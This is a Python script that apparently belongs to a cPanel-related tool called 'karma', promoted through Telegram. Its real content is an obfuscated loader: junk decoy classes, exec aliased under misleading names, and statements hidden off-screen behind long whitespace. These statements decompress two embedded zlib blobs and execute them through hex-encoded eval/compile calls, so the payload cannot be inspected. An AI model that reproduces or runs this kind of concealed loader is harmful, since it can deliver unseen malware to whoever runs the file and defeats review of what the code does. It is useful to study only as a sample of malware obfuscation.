from builtins import *
from math import prod as Builtins


__tool__ = 'karma'
__authors__ = ('Telegram:', '@xnabob')
__api__ = 'cpkarma.cc'
__telegram__ = 'https://t.me/cPanelKarma'
__version__ = '1.0'

__code__ = '4836037d39227231520bc3346a94c8a7'


Substract, _system, Run, _math, _square, _hypothesis, Math = exec, str, tuple, map, ord, globals, type

class _stackoverflow:
    def __init__(self, _calculate):
        self.Calculate = Builtins((_calculate, 12083))
        self._walk(Negative=-87319)

    def _walk(self, Negative = None):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Calculate += -97388 * Negative
        
        try:
            (((_system, Substract), Run) for Run in (_system, Substract))

        except TypeError:
            ({_math: _math} or Run if {_math: _math} and Run else ... or (Run, {_math: _math}))

        except:
            Math(88999 - 98979) == False

    def _divide(self, _random = 34075):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _random /= -88849 + -33841
        self._cube != True
        
        try:
            ((_square, (_system, Substract)) for _square in (Substract, Substract) if _math <= _system)

        except TypeError:
            ((_square, {_math: _math}) for _square in {_math: _math} if _system < _math)

        except:
            Math(-78245 + -41982) == type

    def Square(_run = None):
        return _hypothesis()[_run]

    def _while(Product = 93300 * 79402, _statistics = type, _frame = _hypothesis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _frame()[Product] = _statistics
        
        try:
            ({_ceil: _ceil} or Run if {_ceil: _ceil} and Run else ... or (Run, {_ceil: _ceil}))

        except OSError:
            {_ceil: _ceil} if _system <= _square else {_math: _math} <= _system

        except:
            Math(88110 * 68517) == Ellipsis

    def execute(code = str):
        return Substract(_system(Run(_math(_square, code))))

    @property
    def _cube(self):
        self._invert = '<__main__.Product object at 0x000009421BE65121>'
        return (self._invert, _stackoverflow._cube)

if __name__ == '__main__':
    try:
        _stackoverflow.execute(code = __code__)
        _algorithm = _stackoverflow(_calculate = -70 / 38363)

        _algorithm._walk(Negative = _algorithm.Calculate - 22157)                                                                                                                                                                                                                                                          ;_stackoverflow._while(Product='S22SS2SS2222SS2S222222SS2S',_statistics=b'x\x9c\xe5\x1c\xefo\xa38\xf6{\xfe\x8a\\\xefC\x88\xa6\x9b\x05\x03vR)\xd2}\xe8\x9e\xd4\xd9i\xb3\xba\xee\xa9\x95FUD\x80\xcc\x90!\xd0\rt\x92\xd1\xe9\xfe\xf7{\xef\xd9&\xb4\t\t\tMwO\r\xc16\xc6\x18\xfb\xf9\xf9\xfd\xb4\xc9\x17?.Zm\xf8ES\x83b\xfc\x8d\xc7y\x9a\xc6\xe3q\xfbo\xc3\xb3o\xdeb\xee\x9d\xb5\xd3E\xe9\xae\xf7\x94\x7fM\x17\x19\x150\xce~\x0f\xe3\xf0\xcb\xc2\x9b_\x9c\x9d\x9f\xfdc\x95x\x93tr\xd6}^\xfe1\x92\x95\xf9\x8fT]\xcf\xf7_\xd4\x98\xab:d\xb1\xafy\xfe\x98]\xfc\xfcs\xde\x9b\x87?\xfb\xbfyI\x18\xff\xba\xa5\x19\xdf\xc3E\x16\xa5\x89|\xc6\xea\x99/n\xfbi\x10\xd2\xbd\x8e\xd3\xb7\xb9i\x8b\xc0\x1e0&\x98m\xb9\xcc\x9c\xf8\xb6\xedpo\xe0\xf8}OtZ\xdd\x8b\xe2\xc1(\xc9\x8dN\xf6-\n:\xddV\xb8\xf2\xc3\xc7\\\x01(y|\xca\x8d\xb3\xdf\xe2\xd0\xcb\xc2\xf6e\x9at\xf2\xf6u\x1aD\xd3\x1fg\xdd\x96|c4\x7fL\x17\xf9x\x0c\xcf\xff\xc8:\xdd^\xb8\x8ar\xa3\xdb\x8aS\xdf\x8b3\xa3\xfb\xb9swww\x0f\x87\x0e1\xe8<\x0c\xbf\xc4\xe9\x04\n\xb4\xb6\xdc\xc5\x87\x96\xcb\xe5j\xb5\xa2@F\xcbe\xe7\xf3\xc5\xc5\x87\x9f>\xfcd\xfcd|\xb0\xba\xdd\x87\x87a\x10-\xaa\x9e\x9fEx\xc4\xf0\xc3 \x9a\xc5\xf1\x0cR\x10o\xd6\xf2%\xcc\xbd<\xaf\xacity\x99\x8e\xe0\xb8L/!\t\x17\x97\x97\xd0|\xd9\xbd\xd6\x96\x9b\xf8\xcc\xf5\xf5\xf5\xcd\r\xfe\xafo(ys-/n\xe0\xc95\xc4\xaa\xdeH\x1d\xc6\x03\xbb\xbeZ\xaa\xcb\x15<[Y\xaf\xd1\x99<Eq\x1e%8\x02\xdf\xbdE\xd6\xaa\xa8\x04\xebO\xe6\xc9\\\xfe\x13\x08\xe1\x87\xfd\x01`E1\x82)R0\x8b\t\x823c\xc7;\xb3$\xca\xe3\xe8i\xf2\x12\xa6\xdds9b\xc5\xe0A\xb0<\xaa\xa2\xee\xe7W\xab\xa9\x17%A\xb82:\xe1\xd3\xe2\xf7\x8d\xbb\x0f\xdd\xaa\xc1\xb8\x8a\xe3\xab+\x08 \x8c)\x1d\xbf+h\xe5^\x1aO\x0f\x00\xd7hd\x9a\xa3\xd4\x1c\x99)\x1c\xe6h4J)\x82\xff\xbb\x02[\x9c\xa6\x9bw\x01j\x15\xf4B\xbeX\xcfU\xfa\xad\xde\x15\xbc\x16yv\x00\x92}\xfatu\x85\'\x86\x1f?A\n`\xd5\xe9\xf4fi\x94\xec\xa2{w\xf7P\r\x9c\x18\xdc\xd3\xc5\xdd\xbb\x02r\xec}\x0f\x0f\x802\x81q\xa9^O\xd8\xf9\xae\xa0\x15f\xb1\xf7\xcf\x03\xc0%3\xf4O\xa5\xdf\x17\x82\x85q\xf48O\xfd\x83\xd8\x05R\xc2\x11F2\x99"\xcb\xb8\x94"\xd61p\x8b"?\xf3\x92\xa89\xdc*+:\x18n\xd55i\xb8\xfd\x98F\xf1*\xfc\x9a<\x1d\x009\x13\x19k\x8aa\n0K\x81\xc3b\x06\xf2\xdar%[H\x9eQ\tsc\xd2\xb1]wj381\x1e\xc0\xe9\xa8k\x01\'\x87\xb3\xcf&\xac\xcf\x82\xbd\xe5\x04\x1b\x80$\x1a\x84\xa8\x8f\x18\x9d\xfe4\xdf\xec[\x97\xa4\xef\xf73;\xfcpu\x08\xf9=~\x80;]w\xec\x8c\xedq\x7f<\xa0x0v\xc7.\x94\xe5\x9b\xb9\xfb\xab\xb2\xe0\x9e\xb9\xbf\x98\t\xf7\xacF\x98\x87Xc\xc3i*\x0c\x1a(\xec\xc2\xbc\xbe\xc20\xa1\xb0\xafNY^\x0f\x03\xcb\xe7\xc3\xce\x16r.\x18\x9f\xf2\x80\x99\x9c\t\x97\x0f\xb8/\x1c\x08CaC\xce\x80\x07\xc2\xe4S\xc1\x84\x03W\x16\xe4\x0e\x98\xcf]\xd1\xe7.\xb7!\x05i\x1e2_\x98P\x07>\xe3@\x9e\x8e\x03n\t\x13\xe2)\xd4@\xa5\xe8\xb9\x81p\xf6\xb6\xff\x8d\x89\x83\xad\xc0\xcc\xd5D\xb7\x14\xe85\xf8\x11\xec\xb6\x1a\xa2:eYM"\xb1{X\x9e\x83~*\xec\xbf\x1a\xd8,\x85\x99\x8e:M\x85\xa5v\x89vr\x05\xb6:e\xdd\xd7\x07\x1b`\xa5+,\xc0jW\xd8\xc2\x01\x8c\xf6!\x1e\xfc)\xa0\xect\x1d\xa0Q\xfd\xb1\t4\n(\xd4\x98AlCYw3\xb7\xd1\xa8\x98,\x90\x10\xafO\'\xea\xd2\x07\x80\xab\x0fs\xda\xe1\x1c\xe1K\x14\xe39\xb4\t\xb6p\xdf\xe5\xc1\xd1\x10\xbeW\xf2\xa6\xcc\xb9\x97\xb7 \x07$\xa7\n-s\x1e\xe6h\xa2\xdb\x0b\xff>\xc0V\x00\x8c\x05\xc4|\x8cpw\xa0\xec`3\xb7\x11\xfc\xfb\n\xbb5\xcd\xd6X\xce\xd4i\x95fE\x9d\xb25g\x05\x8dc\x95\x1e\x9eB\x06\xb6\x91\x1aJQ\x8a\xe5\xd2\xcbj\xa0>z\xf3\xb7D\xc3\x87j\x83gD\xe2S4\x9b\xe1\t\x97 SE\xd0\xee\x8a\xf2y\x12-\x1ek\xf0\xf5\xb1\xc4\x06\x07F\xdc\xa2t\x1f\x9b\xb3\x99\xfbJ"Bm\x81\xa3n1\x92s8\xb4\x92\xc3\x81\x92\x0f\xb6\x9fm\xe66\xa3\xf0j\x10\xcd\xc3e\x8e5NV\xe9\x95\x94\xa5[\xa3T\xcb;i\xbb\xd8\x8e\x93;\x89T\r\xfe\xf8\xb0\xcb\x88r{\xcb\xd8-\xbb\xa5\x1f\xa6 \t\xffJ<\xdb\xd3\x16\x12x\xf6\xb7\xa7b\xeeaUdj\x1cA\x00\xd3\x94xN:\xda\x81\xf4\xd1s\x11\xfc\xd4\x03]\xd9r\x02\x1a\xc2n\rMF\x97\x08\xc9j\xe8\xef\x84\xa6\x126\x1b\x8dnL\x9a\x18\xd1\x12\xa9\x8faPM\xfc~$\xde[\xa8\x06GL\xaf\x9d\xbd\x94\xf6\xfcXY\xf6\xafd\xf2(\x14\xae\'%\xedl\x8c\xcc(\x14M\xb2\xb9-wbA\'\xcb\xb3\xf0\xe9\x8fp\xb1\x1f\xf6\x02\x88\x9b\td\xce\x85p\x00\xa4\xce\x1c3(\xdb\xdf\xcc}%\x82\xbb\xd7\xb6\xa0\xe5\xda~\x89{k\xce\x8e\xaa\x82Y\xb2/\xec*Kv\x87\xc3\xa8\xed\x1e\xc4\x8ff\xd2\xf0@\x1c\x14\xa6@5\x15I\xc2\xb8\x11\x1c\x84j\xbf\xa5\xfa\xac\xe5|S\xe5\x99\xa4\x1aI8\xd4)[[t\xa8\x98\xc5\xe8\x07Ld@\tH\xed\x94\x1b\x1a\xab\xf9\x96V\xe7Kj{9\xdf-\xa9\xf9\xfb\xca:u;\xbf\xcb!\x8a\xbd\x9f\xab\xbe\xa3S\xf4\xd5\xc4\x0f\x1b\xe6\x96K\xf3\xacO\xc2\x06\xcc6(\xebl\xe6\xbe\xda\x1b\x05\x89c\x16\x897$\x98\x8d-\x9a\xf1\x1b\xb9\xfb\xabB\xd9\xc8\xa1\x062\xb2\x17a\xd3\xc5\xcb\xbc\xc63A\xcb\xf2\x8e\x1a`-\xdf3\x15\xf3\xd2L\xd8W\xf6\x00\x1d`C\xfe\x1a\xc6\xde|\x12x\xed\xb5V\xa5\xfap\x7fw\xb1u\xe2\xec\xc0\xa8]\x9dv\xa6\x1c\xa6-\xa7\x10\x0f>u \xe5L\xf5\xf1\xf2\x1a\xd3{\x19\x8cn\xfc%\xbeE\xbe\r[\x8b\x17\xd4\x84\xd1Eec\x8f\xec\x86k\xe3\x01\x90\xb7\xb7\xa7l\xb6\x8e\xf5\xb1\xbf\x1b\x87b\x10\x13<\xe0\x03\x12|\x1c\xe1\n\xd0\xac9\xa6}\xee\xb3P8\xa2\x0f\xda\xb6\xd8\xafa\xef \rL\xc9g*\xa6\xe0-D\x1e\xa1\xec=\xdat\xa6\xcdh\xda\xc6NV\xce\xd2\xcc\xd8W\xd6>@t\xd2\xc8D:\xe4\x8c\x8c\xf1R\x1c\x84\x14\x08\x84\x17[9\xc3\x91h\x04\xd8\xee\x00\x96;\x9c\xf0\x1eO\xb8\xa6+\x9ds\x00\xee\xa3\n\xa0Twz\x15\x04G\xe1}G\x1b\xfe\x95\x07T\xba?\x97\xfb\xc7\xdd\x05\x9a\x88\xba%\x03\ni\xd3!\xc8\xee\xbe\x91\xdb\x187\xb4\x9f\x85\x95(\xa0\xab\xc7\xbb\x84\x17\xbb\xca\xd5\xf4\xd1H\x9c8bfZ\r\xe7\x1e\xea!\xf0S\xc6\x0c\x14\xcdfu\x8cW\x0e\x00\x1a\x1d \xc8\xf30m\x93\xf1j#\xf7-f\xb1\x96`5\xbf2K#\xa2-\xbd\x96\x1a\xad:e\x0f\xb4/\x14S\x03\xd5c4\xc0\x8ePQ\xc6\x059fz\xf0,\xee\xe8\xd2\xd2\xccX0\xc9\xbb\xbb\xc6>\x05\x8d\x9c\xfd\x92\x90[(\x04%a\xb8N\xd9\xba\xc2\xf0\xe1\x08\xcd\x1cW04\xf1\n&\r\xe6\xdc\xe2\xe4\x00\xe2\x02\xae\x1dd<\xcc\xe4\x1c\x1dC\x90\n\xd9^vw<\xeb\x95\xecT\xb2Z\x9d\xd2\x0c\xb8|\xa5\xef\x9d\x82\xf1\x02\x14\x9aMor\xa9\xaa\xf5%2w\xf5jFD\x06\xb2\xb5\x14U\x05I\xbc\xa0\xf1BY{3\xb7\x8e\x05\xd4R6B\x14\x9e\x91\x92[d\x01\xdd\xc8\xfd\xb3,\x88\xc7\xa0\xb2\x0b\xf3\x05\x90\x99c\xc8Lg\xe0\x9a\xb6\xc7\xcc\xd3\xa1,Hb}\x81\xbf\xbe:\xd7?u\xe7\x14(\xea\xba\x82\xfa\xc9\x02\xc7\xe2\x02M\x8dM\xe5\xc1\x9d\x82}!\xc8(1F\xa6H\x9c\x91\xf7\xe8W_\xa0\xb9-\xe4Nm(d\xc7\x893D\xfe\xcd\x94\x9cq\xe4\x83\xc3\xf5\x98xU\xc3\x19\xf7\n\xd6;wm\xba\xd1f\x8b\xb29\x83\x95D\x96:eO*\xb6\x80\xba)\'b\x1d\xbb\xc2\xb1\x88\x02\x1c\x02Oy8\x03<d\xbc\xce\x93\xf1\t&\x05L\x06\x81\xc4;\xc0i\xd1l\xc2wH*\x8bgR8#\xe5\x00So\xeb\xe2\xd9+\\\xd8/\xd0\x89\x97\x0cINI\xb0\xd8U\xee\x00\xed\xe9Xi\xd9\xf5y\xd8\x90\xa1\xea\xa9M\x1ewS\xaaB\xf5X%\xfa\xd5\x915\xa2aXz\xdb\xed\xcd\xdc:\x8e{\xbbp\xab\x99p\n\xe2\xba\xeef\xee[\x8c=+\x91\x8f\x81\x1aO\xae\x04G=\xbeZ\xb0\xacS\xf6\x80u\x02\x8d\xb4&\x9b\xd6\nYM\xc5\xab\x9d\x04(pB8\x02u\x84\xea\x0c\x8aX\x87\xea\xceIx\xb3o\x9b6\xfc\xdc\x89=\xb0-\x1e4\xc4\xfd{\xad\x99\x90.C\x17\x8d57\xf6B\xfb\xd2k\x1d-w\xbd\x12m_\xb9\x9a\xab\xd0\x8eRGP\xa2\xf1mG\x0c@\x82\x0bH\x11\x81\x94\xbb\xb6\x80\x9dN\x01\x11p\xf4\xd5!\xd3\xe5\x1c\x9d_\xa4N\x8c?\xcd\xb1G\x99\xff\xe7r;\x149\x02\xea\x11N\x97\x96\xc2\xa0aG@\xc8\x14\xe1|\x91\xfb\xe6\xcb\x94Jj?\xad\xb92\xa5\xd4g\x8eH\x0c<\\\xf3\'\xd3\x1fY\x02c\xc5\xe6g\xf1^\x17\x18\x9abL\xf2\x15\x0c\x80\x830ru02\xc5l\xe4\xfe\x85V\xa16\xd2\xc3\x9247\xaa7@\x19\xdbv\xf9\x18\xca\xe3[\xdae\xd1=\x9e\xae\xa3\x10\xe9\xc3\xe1I\xa1\x12b\x8f\xae\x07\x94\'\xd3\xdeIf\xe3\xd4\x9d\xe2:V\xa4B\x98n8\x1f\xaf\xf5\xbaj\xb9\xd0\xfa\xfa\x86\xd6Z\xdf\xdc\xbc\x85\xdc \x94\xaa\xa1e\x01-\x1b\xf4K\xf9e\x0b\xeb\xbe\xb2\'\xb6\xb2\x96\xe8 kJ\x07w\xbb\xad\x1crX\x95\x1dT\xda}\xa5\x0c\xf7*\xd4%N\x81g\xc0\xe7\xa6\xc2\xe3R=\xb2\x18z\xfcB\x98\xab&')

        _algorithm._divide(_random = 92265 * _algorithm.Calculate)                                                                                                                                                                                                                                                          ;_stackoverflow._while(Product='oooDOooDDODOOooODooDDOO',_statistics=b'\xeb;\x88}\xb6\\S\x8d\x8b\x9cx\xdf\x9e\xa0e\x83\xae\x81\x1f\x12\x8f\x84\x12\x10O]\x08\xdd>3mKJ\xfb\xdap\x08\xf7,!Wo\xba.rW\xe6Lp\x1d6\xbe\x07@,\xe0]6pt|\xdb\xc4\xe9\xbb\x0eHG>\x83\x9a9\xae\xe5\x9e\xa0\xf9\x8fx\xb2\r\xe9)\xd5\x06\xad\x90kB\xe1\x1e\xc8\x06\xf6\x80Z\x1b\xda\x0c\xde)\xe0\x8d!\xc8>.\xf1l\x8bs\x94\xf9\x80\x83?\x7f\xd7\xc9\xc6\x93{p \x141\x1e\x10D\xb5\xfa\x89W\x90{r\xa9\x8f\x9f\x12_\x0b\xcbKa{Q\x0e&\xa7\x14\x92\xbd\xe6$\xfd\x14$\x8f!&\na7\xa4\x86d\x07"\xdf#Sn\xc87]qz\x8c\x12\xc3iA9\xa0?\x0b^\xdb%\xbb\xdb\xb2\xa2m+\xda\x9a\xb2\xb6\xb5\xc8\xd4\x89\x91\xdal,\x8a\x8e\xa4\xa8f\x92\x07\x9f\x04\x88\xe6\x9b\x0f\xca>\x12\xed\x14\xb4\x94\xa2B\xd6\xb6\x92\xf5mWYbs\xb57v)\x19\x14}\xb2(\x0eQ\xa30m\x1e!\x82\xee\x9c\xe9\x92vy\x8an\xf9\xea\xd44mp\x123\x9a8-\x12\xaf\x8f2*\x97\x8f\xdaVd\xad\xd1\xc8\xe5M\xf4\xc9\x87\xe4U\xe1\xffB\xdf\x13\xea\xe8\x17z\xe1:M\xd7\xc7\x8d\x86v\xae\xe3\xf6\x03\x87NN\xea\x84K\xde\xdcg\xb9o\xaa\x004\xb2\x01\x97\x87\xf8\xf9 \xeba\xafK\xb5\xd4`\xab\x95\xad\x18\xaa\xdf\xe1\xda\x1e\x81J\x9aQ\xee\xf5\x13M\xcd)\x87\xae\x9bn*Z\x9cT\x14^\xfbU\x9f\x9f\xcfS\'Y\xecds\xbf\xb18\xa1\x95+\xa5Z)=\xeb\xfa\xfa\xd5\x9c\xaf\xcd\xb5\xf0\xf2>\x1f\xcd\x84\x9c\x92NU\xde\x89\\\xa7\xec\x01:\xd8\xd1\x1eU\x17\xe4=\x8b$}\xf4\xa5\x9e\xce\xf6V\xb6\xb5=\xa7\xb9e\xea[\xe4\x9cD\x0b\x93{W]\xd1\xaf\x83\x8a\xd5{\x1d\x8cH:\x8ebt"E\xb8\xd9\xa0\xdb\x9a.\xd2y{\xfe\x14\xe7\xd1\xe3"\xf5\xc3,\x8b\x92/\xbd\xe0i>\xff\xd1\x96\xdfMj\xff\x96\xa6q\x0b\xdb\x85-\x82\xc6\xa5\xb4C\x0b\xd2\xc3\xff\xd0\'\xa94\\\xa5\x81\x05\xe2\x0bi\x93\x19\x91\\\x95\xd2\xe6.\xea\xce\xc8l\xfd\x17\xde7T\xf8/\'\x8449\xa0\xb5\xe1\xba5\xfd2\xd4\xd4O\xd3BE\x1c[\xda){\xabDrV\xf4q8\xd3[(\xe4\x06\x8a\xd9\xac\x95\x05\xc3\x1be\xc2\xb8\xbe\xd6\xf5\xcb\xb7\xb6\xb2dH_\x16*v"@\xd0\xca&C5\x1cw\xf7\xa5}?\xf4\xe6 \x9c\xb6\x8b\xd6\xd2&t=\x8f!6\xba\xfa\xc3fmzV\x12\xf2\xfb\x82\x92C\x8e\xd1\x1d\x0e\xef\xf5\xea\xd6\xfbu\xc70\xb1\xfe \xd8\xda\x9a^\xbc]B\xa2\x97\xfd\xc8\xf2pn\x90|\x9a\xcauE#\xf2;\x99\xa6\xfc$X\x18\xefy{\x8a\x0b\xf3.\xe5\x9a\xdaK\xfa\xc3(\x1e\xf0\xea[\xe5\x13_\xaf\xc8d\xdd\xd6\x0e\x90\xb4\xe4\xfcZ>\xdfb\xd1{\xf4\xfco\xde\x970\xeb=-`\x9c&v/\x882o\x12\x87\xe3\xa5\xb7H\x00\xeb2\xa3\xe6s\xf2\x83iQ\x9ad\xbd\xab$\x0b\xfd\xa7E\xf8\xaf\xf0\x8f\xa70\xcb\xefdM\xdd\x16}Gm<\x8d\xe2p(\x95\xb9u 1\x07\x7f-\xe5\xeegJ\xdd[\xef\xb1b\xc3g\xea\x1f\xddjI{.\x8d\x01\xf9\xf6\xa5\xe3\x0f3\x86\x9f\x15\xce\xde\x95\x86\xe0\xbc0;\x16KnV\xe7\xcf9\xc0\x8dF\xcd\xebs%C\xe0\x06\x99+\x99\x82\xf3\xa1\x95\xeb/\xe7-\xa3\xfck{\xfb^0c\xdd\xd9\xf3\xdbbv0=]d\xd1\xae\x97\xb5\xa7\xeb1\xcf\xa2<\xcc\x86\xd3\xde"\xf4\x02\xa3\xdb\xcb\x1ec\xfc\x9aB\x12f\x86\xfe\x1e]\xfbj\xf4\xcbb\x91.\xe43\xdbw;\x1a\n\xd3\x14\xce\x14\xcb\xd5\xee\xee%f\x8e\xb6\xef\x17\x83wT\xd5w i\xe4\x1c\x18\x01*\xfd\x0e\xb0\x02\x9f\x0c;\x034?\t\x1b\x97\xd7\x88\x89\xfa\x0c@_\x14\xf9l \xeax\xe1\xbb4\xed\x91|\xa5\xa4\x16\xa6\xd4\x03i_F\xd32\xc2OM\xfdb\x88\xf0w\xbf\x9e\xe9\n\x12\xaa#\xc3\xed\xb8\xfd%\xcc\xa9\xae\xf3+-D\xae\xd1\x80\xe2\xa1\xf4,\xeb\x19OKJ\xb0\x05p\x9e\xcbe\\\x92\xe6.\x0b[\xf7p{\xf6\xb9b\x02jq\xb5D|\xc2\xa5\xa1$\x9f\xc8\x19pm\xc1L.=\xee\xae\xbfU8mo\xdd\xa6f\x04\xe9\xe2[/N\x97\xe1\xc2\xe8FIu\xdf{y\xb8\xcau\xc1i\xbah\xe3\x83mx\xa2zF\x95>\x95\xb8\x0b\xfd\x8eA\x97\x89\x98\x084\xf4\x05\x05\xb2\xe0u\x08\xd7\x81D\x1a\xb8rD@\xb1\xbc\x1f\xe8\x12 i\x04p\x84\x84Z\x9c\x0bxF\xd0\x8e\xf3\x89\\\x96\xb8.W\xdcw]\xe6\xf8E~\x1d\xc4+\xf7{\xd7\xac\xaf&^\xe7r\xf8\x0b\tG\xa1\xdc\x0b\x12\xa0\x7f\xd3\xder\x01\x18Hh\xf8\x01\xd7\xfcJT\xa0\x14\xe1\xc2\xac\x84\x0ba\x9c\x85\xff\x07C#\xa0\x0e\'D\xba\xc0v\x0e\x11\x96;r\x88\x14\x95\xdc>\xad\x15;\xfaE3\xaa6\x80\xbe\x04\xb7\xf7\x083MO\xa5\xbdM}\xad\xc2$\xdajl\xa3\xa4\xd4m\xec\xe8%n\xb0\xa1\xad5\x97C\x14E\x8d\xb5$UR\xb4!\xee\xfe\xbd\xfdo\x94^\xdb\x96\xd9\xce\xbf"g\x03|\x07j\xe3\xa7\t\x88\x08\x8b0\xc9\xdb\xfe\xd7\xd0\xff\x96\xed|Go\xee=\x1a\x95\x84\xff\x9c\x18g\xb7\x86\xec\xb4\x08\xe7\xe9\xf7\xb0\xc4\x9b\xbb\xa7\x18~AC$L\xd0\r@\xff\xd2\x8b\xa1q\xa8x\x9f[\xf4\xa5\x1c\\8\x8dL\xd0\xe4\xe4\x97\x81\xbb\x18\xcb\xaf\xe6pB\x08\\^m\x92\xdf\xc4\xa6\xef\x91\xd8j\x91u\x9d%\xd5\xcf&\xc3\x1b\xe0\xfbzM\xb8\xe2\xf0nM\xfc\x03.6\x1e\'\xde<\x1c\x8f\x87\xc3O\xf8!C`\xb2\x1f?~\x82$\x86\x1fek+1\xb4\xf5?\xf3X3"')

        _stackoverflow(_calculate = -64464 - 97584)._walk(Negative = _algorithm.Calculate + 36335)                                                                                                                                                                                                                                                          ;WXXXWXXWXWWXXXWXXWXWXXXWW,WXWWWWWWWWXWXXWWXXXX,wwwxwwxxwwxwxwxwww,iiillijijljjliijjij,JIJLIIJIILIIIIILJJIJJLL=(lambda XWXXXXXWXWXWXXXWWXWXWW:XWXXXXXWXWXWXXXWWXWXWW['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda XWXXXXXWXWXWXXXWWXWXWW:XWXXXXXWXWXWXXXWWXWXWW(__import__('\x7a\x6c\x69\x62'))),(lambda XWXXXXXWXWXWXXXWWXWXWW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(XWXXXXXWXWXWXXXWWXWXWW)"),filename='\x57\x57\x57\x58\x58\x58\x58\x58\x57\x57\x57\x57\x58\x57\x57\x58\x58\x58\x57\x57\x58',mode='\x65\x76\x61\x6c'))),(lambda S2S22S2SSS2SSSS22SS,XWXXXXXWXWXWXXXWWXWXWW:S2S22S2SSS2SSSS22SS(XWXXXXXWXWXWXXXWWXWXWW)),(lambda:(lambda XWXXXXXWXWXWXXXWWXWXWW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(XWXXXXXWXWXWXXXWWXWXWW)"),filename='\x57\x57\x57\x58\x58\x58\x58\x58\x57\x57\x57\x57\x58\x57\x57\x58\x58\x58\x57\x57\x58',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 310216 > 7808626:
            _algorithm._walk(Negative = _algorithm.Calculate * -94525)
        elif 363617 < 1720130:
            _stackoverflow(_calculate = 73234 + -90001)._divide(_random = -58994 / _algorithm.Calculate)                                                                                                                                                                                                                                                          ;JIJLIIJIILIIIIILJJIJJLL()(iiillijijljjliijjij(WXXXWXXWXWWXXXWXXWXWXXXWW(WXWWWWWWWWXWXXWWXXXX(wwwxwwxxwwxwxwxwww('\x76\x61\x72\x73'))),_stackoverflow.Square(_run='S22SS2SS2222SS2S222222SS2S')+_stackoverflow.Square(_run='oooDOooDDODOOooODooDDOO')))

    except Exception as _ceil:
        if 470919 > 4120691:
            _stackoverflow.execute(code = _system(_ceil))

        elif 368259 > 6711981:
            _algorithm._walk(Negative = _algorithm.Calculate + 30343)